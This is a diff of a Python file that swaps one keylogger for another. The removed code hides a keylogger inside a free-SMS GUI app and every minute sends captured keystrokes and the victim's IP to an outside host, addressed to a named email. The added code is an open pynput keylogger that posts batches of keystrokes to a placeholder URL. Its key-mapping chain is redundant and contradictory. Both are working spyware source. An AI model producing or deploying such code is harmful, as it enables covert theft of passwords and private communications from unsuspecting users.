@@ -1,108 +1,198 @@
-import pynput.keyboard
-import threading
+from pynput.keyboard import Key, Controller, Listener
+import time
 import requests
-"""___________________________________"""
-"""vista cliente"""
-from tkinter import *
-from tkinter import messagebox as MessageBox
-import requests
-""" Fin vista cliente"""
-"""vista cliente"""
 
 
-root = Tk()
-root.title("SMSFREE")
-root.geometry("430x200")
-root.resizable(0, 0)
-def contact():
-    you = StringVar()
-    you.set("https://www.youtube.com/channel/UCSJ0FKKF-tUeu_Oa-1Z07lA")
-    Label(root, text="Youtube: ").grid(row=4, column=0)
-    Entry(root, textvariable=you, width=45).grid(row=4, column=1)
-    Label(root, text="Created By Piter", font="bold").grid(row=5, column=1)
+keyboard = Controller()
 
-def exit():
-    root.destroy()
-    
 
-def enviar():
-    enti1 = ent1.get()
-    enti2 = ent2.get()
-    if enti1 == "" or enti2 == "":
-        MessageBox.showinfo("Error", "No puede dejar campos vacios")
+keys = []
+
+
+def on_press(key):
+    global keys
+    # keys.append(str(key).replace("'",""))
+    string = str(key).replace("'", "")
+    if string == "Key.space":
+        string = " "
+    if string == "Key.enter":
+        string = "\n"
+    if string == "Key.backspace":
+        string = "Backspace"
+    if string == "Key.tab":
+        string = ""
+    if string == "Key.caps_lock":
+        string = ""
+    if string == "Key.shift":
+        string = ""
+    if string == "Key.ctrl":
+        string = ""
+    if string == "Key.alt":
+        string = ""
+    if string == "Key.cmd":
+        string = ""
+    if string == "Key.delete":
+        string = ""
+    if string == "Key.insert":
+        string = ""
+    if string == "Key.home":
+        string = ""
+    if string == "Key.end":
+        string = ""
+    if string == "Key.page_up":
+        string = ""
+    if string == "Key.page_down":
+        string = ""
+    if string == "Key.tab":
+        string = ""
+    if string == "Backspace":
+        string = ""
+    if string == "Key.shift_r":
+        string = ""
+    if string == "Key.shift_l":
+        string = ""
+    if string == "Key.ctrl_r":
+        string = ""
+    if string == "Key.ctrl_l":
+        string = ""
+    if string == "Key.alt_r":
+        string = ""
+    if string == "Key.alt_l":
+        string = ""
+    if string == "Key.cmd_r":
+        string = ""
+    if string == "Key.cmd_l":
+        string = ""
+    if string == "Key.f1":
+        string = ""
+    if string == "Key.f2":
+        string = ""
+    if string == "Key.f3":
+        string = ""
+    if string == "Key.f4":
+        string = ""
+    if string == "Key.f5":
+        string = ""
+    if string == "Key.f6":
+        string = ""
+    if string == "Key.f7":
+        string = ""
+    if string == "Key.f8":
+        string = ""
+    if string == "Key.f9":
+        string = ""
+    if string == "Key.f10":
+        string = ""
+    if string == "Key.f11":
+        string = ""
+    if string == "Key.f12":
+        string = ""
+    if string == "Key.num_lock":
+        string = ""
+    if string == "Key.scroll_lock":
+        string = ""
+    if string == "Key.pause":
+        string = ""
+    if string == "Key.print_screen":
+        string = ""
+    if string == "Key.menu":
+        string = ""
+    if string == "Key.backspace":
+        string = ""
+    if string == "Key.enter":
+        string = ""
+    if string == "Key.tab":
+        string = ""
+    if string == "Key.space":
+        string = ""
+    if string == "Key.escape":
+        string = ""
+    if string == "Key.delete":
+        string = ""
+    if string == "Key.end":
+        string = ""
+    if string == "Key.home":
+        string = ""
+    if string == "Key.left":
+        string = ""
+    if string == "Key.up":
+        string = ""
+    if string == "Key.right":
+        string = ""
+    if string == "Key.down":
+        string = ""
+    if string == "Key.select":
+        string = ""
+    if string == "Key.print":
+        string = ""
+    if string == "Key.execute":
+        string = ""
+    if string == "Key.snapshot":
+        string = ""
+    if string == "Key.insert":
+        string = ""
+    if string == "Key.help":
+        string = ""
+    if string == "Key.undo":
+        string = ""
+    if string == "Key.redo":
+        string = ""
+    if string == "Key.back":
+        string = ""
+    if string == "Key.forward":
+        string = ""
+    if string == "Key.stop":
+        string = ""
+    if string == "Key.refresh":
+        string = ""
+    if string == "Key.volume_mute":
+        string = ""
+    if string == "Key.volume_down":
+        string = ""
+    if string == "Key.volume_up":
+        string = ""
+    if string == "Key.power":
+        string = ""
+    if string == "Key.sleep":
+        string = ""
+    if string == "Key.wake":
+        string = ""
+    if string == "Key.web_search":
+        string = ""
+    if string == "Key.web_home":
+        string = ""
+    if string == "Key.web_back":
+        string = ""
+    if string == "Key.web_forward":
+        string = ""
+    if string == "Key.web_stop":
+        string = ""
+    if string == "Key.web_refresh":
+        string = ""
+    if string == "Key.web_favorites":
+        string = ""
+    if string == "Key.web_search": 
+        string = ""
+    if string == "Key.web_home":
+        string = ""
+    if string == "Key.web_forward":
+        string = ""
     else:
-        resp = requests.post('https://textbelt.com/text', {
-          'phone': enti1,
-          'message': enti2,
-          'key': 'textbelt',
-          })
-        string = str(resp.json())
-        
-        if "error" in string:
-            MessageBox.showinfo("Error", "No puede enviar mensajes a este numero")
-        else:
-            MessageBox.showinfo("Enviado", "Mensaje enviado al \n " + enti1)
-            ent1.set("")
-            ent2.set("")
+        keys.append(string)
+        main_string = "".join(keys)
+        print(main_string)
+        if len(main_string) > 1000:
+            nav = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
+            url = "su url que reciba los datos"
+            send = requests.post(url, data={"key": main_string}, headers=nav)
+            print(send.text)
+            keys = []
 
-ent1 = StringVar()
-ent2 = StringVar()
-Button(root, text="Salir", command=exit).grid(row=0, column=2)
-Label(root, text="PiterSk", font="bold").grid(row=0, column=0)
-Label(root, text="Ponga el numero: ", fg="black").grid(row=1, column=0)
-Entry(root, textvariable=ent1, width=45).grid(row=1, column=1)
-
-Label(root, text="Escriba el MSG: ", fg="black").grid(row=2, column=0)
-Entry(root, textvariable=ent2, width=45).grid(row=2, column=1)
-
-Button(root, text="Enviar", command=enviar).grid(row=3, column=0)
-Button(root, text="Contacto", command=contact).grid(row=3, column=1)
-root.mainloop()
-"""keyloger"""
-"""______________________________________________________________"""
-log = ""
-def process_key_press(key):
-    global log
-    try:
-        log += str(key.char)
-    except:
-        if key == key.space:
-            log += " "
-        else:
-            log += " " + str(key) + " "
-
-def report():
-    global log
-    if len(log) > 0:
-        print("[+] Enviando reporte...")
-        print("[+] Report: " + log)
-        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
-        ip = requests.get('http://panamasocail.com/ip.php', headers=headers).text
-        print("[+] IP: " + ip)
-        dat = "\nip:" + ip + "\n" + "\nreporte:" + log
-        send = requests.post('https://panamasocail.com/smtp.php', data={'to': 'piterivano112@gmail.com', 'subject': ip, 'message': dat, 'from':'keylogger'}, headers=headers)
-        envio = send.text
-        if envio == 'Se envio el correo':
-            print('Se envio el correo')
-        else:
-            print('Error', 'Error al enviar el mensaje')
-            
-    else:
-        print("[-] No hay pulsaciones.")
-    log = ""
-    timer = threading.Timer(60, report)
-    timer.start()
+def on_release(key):
+    if key == Key.esc:
+        return False
     
-keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
-with keyboard_listener:
-    report()
-    keyboard_listener.join()
-    
-    
-"""________________________Fin keylogger__________________________________________________________"""
 
-"""fin keylogger"""
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 
-
-"""_______________________Fin vista cliente_________________________________"""
-    
